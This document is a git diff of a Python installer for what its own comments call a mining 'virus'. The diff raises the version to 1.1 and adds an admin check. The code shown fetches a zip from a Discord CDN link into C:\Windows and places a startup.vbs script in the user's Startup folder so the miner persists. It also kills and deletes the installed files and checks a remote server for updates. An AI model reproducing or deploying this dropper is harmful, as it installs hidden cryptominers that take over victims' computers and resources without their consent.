@@ -1,4 +1,3 @@
-# Importing modules...
 import os
 import subprocess
 import psutil
@@ -8,6 +7,7 @@ import requests
 import zipfile
 from subprocess import Popen, CREATE_NEW_CONSOLE
 from urllib.request import Request, urlopen
+import ctypes
 
 # Get windows username
 username = os.getlogin()
@@ -33,11 +33,18 @@ def download(url: str, dest_folder: str): # Takes url and destination folder as 
     else:  # HTTP status code 4XX/5XX
         print("Error: " + str(r.status_code)) # Print error code if download failed
 
+def isAdmin(): # Function to check if process is running with admin privilegs
+    try:
+        is_admin = (os.getuid() == 0)
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return is_admin
+
 # Define main function
 def startup_main(self):
     os.system("cls") # Clear console
     print('─' * 36) # Print 36 dashes
-    print("Temal.cf GPU Mining System, V - 1.0") # Print title
+    print("Temal.cf GPU Mining System, V - 1.1") # Print title
     print("Copyright (C) 2022 Temal#5222") # Print copyright
     print('─' * 36) # Print 36 dashes
     # Show options:
@@ -101,7 +108,11 @@ def startup_main(self):
                 download("https://cdn.discordapp.com/attachments/799772068278566913/934165026703569016/file.zip", dest_folder="C:\\Windows")
                 download("https://cdn.discordapp.com/attachments/933818629554847826/933839613783572480/startup.vbs", dest_folder=f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
             except:
-                print("Could not download files from the network.") # Print error if there was an issue downloading files from the network
+                # Print error if there was an issue downloading files from the network
+                if isAdmin():
+                    print("Could not download files from the network.")
+                else:
+                    print("Could not download and install files because this process is not running with admin privilegs.")
             else: # If there was no issue downloading files from the network, install files
                 print("Files downloaded\nInstalling now...") # Print that files were downloaded and are now installing
                 try: # Try to unzip files
@@ -231,10 +242,13 @@ def startup_main(self):
         if check_is_running("winX.exe") == True: # If virus is running, following statement will be executed
             os.system("taskkill /F /T /IM winX.exe") # Terminate virus
         def mass_delete(filepath): # Function to delete all virus files
+            global failed_uninstall
+            failed_uninstall = False
             try:
                 os.remove(filepath)
                 print(os.path.basename(filepath) + " - " + colorama.Fore.LIGHTRED_EX + "REMOVED" + colorama.Style.RESET_ALL)
             except Exception as e:
+                failed_uninstall = True
                 print(os.path.basename(filepath) + " - " + colorama.Fore.RED + "FAILED" + colorama.Style.RESET_ALL)
         print("Please wait...") # Print that the user needs to wait
         time.sleep(3) # Wait 3 seconds before executing the following statements (this is strongly recommended to avoid errors)
@@ -287,9 +301,12 @@ def startup_main(self):
             mass_delete("C:\\Windows\\nvrtc-builtins64_102.dll")
         else:
             print("Info: nvrtc-builtins64_102.dll not found.")
+
+        if failed_uninstall == True:
+            print("\nOne or more files may not have been deleted because this program was not run with admin privileges.")
     # If user input is 7, following statement will be executed:
     elif startup_main_input == "7": # Check for updates
-        current_version = "b'1.0'" # Saves current version of the virus in a variable (do not change this)
+        current_version = "b'1.1'" # Saves current version of the virus in a variable (do not change this)
         try:
             req = Request('https://temal.cf/miner/version.json', headers={'User-Agent': 'PyMiner32'}) # Connects to the website
             webpage = urlopen(req).read() # Reads the webpage and saves it in a variable
@@ -297,7 +314,7 @@ def startup_main(self):
                 print("You are using the latest version.") # Print that the user is using the latest version
             else: # If the current version is not the same as the one on the website, following statement will be executed
                 print("There is a new version available.") # Print that there is a new version available
-                print("Contact Temal#5222 on Discord for more information.") # Print that the user needs to contact Temal#5222 on Discord for more information
+                print("Contact Temal#5222 on Discord for more information or check www.github.com/temal32/minervirus-hub.") # Print that the user needs to contact Temal#5222 on Discord for more information
         except:
             print("Could not check for updates.") # If the user is unable to check for updates, following statement will be executed
     # If user input is 8, following statement will be executed:
